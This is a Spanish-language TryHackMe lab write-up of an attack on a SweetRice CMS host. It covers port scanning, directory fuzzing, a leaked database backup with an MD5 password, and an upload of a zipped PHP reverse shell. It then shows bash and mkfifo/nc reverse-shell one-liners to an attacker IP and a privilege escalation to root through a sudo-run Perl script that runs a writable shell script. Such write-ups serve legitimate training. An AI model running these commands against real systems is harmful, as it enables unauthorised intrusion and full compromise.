---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - HTTP
  - FuzzingWeb
  - CMS
  - UploadFile
  - ReverseShell
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo -l|Sudo -l]]

---
## Enumeración
### Ping

`ping -c 1 10.80.175.108`

![](Screenshots/Pasted%20image%2020251201114630.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.80.175.108 -oG allPorts`

![](Screenshots/Pasted%20image%2020251201114911.png)

`nmap -p22,80 -sCV 10.80.175.108 -oN targeted`

![](Screenshots/Pasted%20image%2020251201114931.png)
### HTTP

`http://10.80.175.108/`

![](Screenshots/Pasted%20image%2020251201115118.png)
#### Fuzzing Web

`dirb http://10.80.175.108/`

![](Screenshots/Pasted%20image%2020251201120326.png)

`http://10.80.175.108/content/`

![](Screenshots/Pasted%20image%2020251201120330.png)

Se observa que se usa **CMS SweetRice**, en concreto la versión *0.5.4*.

Se realiza una búsqueda por los directorios, anteriormente enumerados y encontramos en la siguiente ruta: `http://10.80.175.108/content/inc/mysql_backup/`, un archivo llamado `mysql_bakup_20191129023059-1.5.1.sql	`.

![](Screenshots/Pasted%20image%2020251201120649.png)

Se descarga el archivo y lo visualizamos.

![](Screenshots/Pasted%20image%2020251201120838.png)

Se encuentra una contraseña del usuario `manager`.

Se identifica el *hash* utilizado para cifrar la contraseña, siendo **MD5**.

[Cipher Identifier](https://www.dcode.fr/cipher-identifier).

![](Screenshots/Pasted%20image%2020251201121044.png)

![](Screenshots/Pasted%20image%2020251201121158.png)

Navegando entre los directorios visualizados anteriormente, se visualiza un inicio de sesión.

`http://10.80.175.108/content/as/`

![](Screenshots/Pasted%20image%2020251201121304.png)

Se accede con el usuario y contraseña encontrados.

![](Screenshots/Pasted%20image%2020251201121359.png)

---
## Explotación
### Reverse Shell

![](Screenshots/Pasted%20image%2020251201121527.png)

Se encuentra una forma de subir archivos para poder realizar una *Reverse Shell*.

`msfvenom -p php/reverse_php LHOST=[IP] LPORT=1234 -f raw > pwned.php`

Se intenta subir, pero no es posible debido a que tiene un tamaño mayor de 2 Mb.

Se observa que se puede subir un archivo *Zip*.

`zip pwned.zip pwned.php`

Se observa que se sube correctamente el archivo.

![](Screenshots/Pasted%20image%2020251201121841.png)

`http://10.80.175.108/content/attachment/`

![](Screenshots/Pasted%20image%2020251201121924.png)

Nos ponemos a la escucha por el puerto `1234`.

`nc -nlvp 1234`

Se realiza otra *Reverse Shell* para no perder la conexión, además de realizar el tratamiento de terminal.

```
bash -c "sh -i >& /dev/tcp/[IP]/1236 0>&1"
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

![](Screenshots/Pasted%20image%2020251201123537.png)

`cat /etc/passwd`

![](Screenshots/Pasted%20image%2020251201123655.png)

Se encuentra el usuario `itguy`.

`cd /home/itguy`

`ls -l`

![](Screenshots/Pasted%20image%2020251201123946.png)
### Escalada de Privilegios
#### Sudo

`sudo -l`

![](Screenshots/Pasted%20image%2020251201124017.png)

[GTFOBins - Perl](https://gtfobins.github.io/gtfobins/perl/#sudo).

![](Screenshots/Pasted%20image%2020251201124137.png)

Se observa el archivo `backup.pl`.

![](Screenshots/Pasted%20image%2020251201124226.png)

Se observa el archivo `copy.sh`.

```
cd /etc/
ls -lah | grep copy.sh
```

![](Screenshots/Pasted%20image%2020251201124754.png)

`cat copy.sh`

![](Screenshots/Pasted%20image%2020251201124833.png)

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] 4445 >/tmp/f" > copy.sh`

Se ejecuta el archivo, antes nos ponemos en escucha por el puerto `4445`.

`nc -nlvp 4445`

`sudo /usr/bin/perl /home/itguy/backup.pl`

![](Screenshots/Pasted%20image%2020251201125217.png)

```
cd /root
ls -la
```

![](Screenshots/Pasted%20image%2020251201125307.png)

---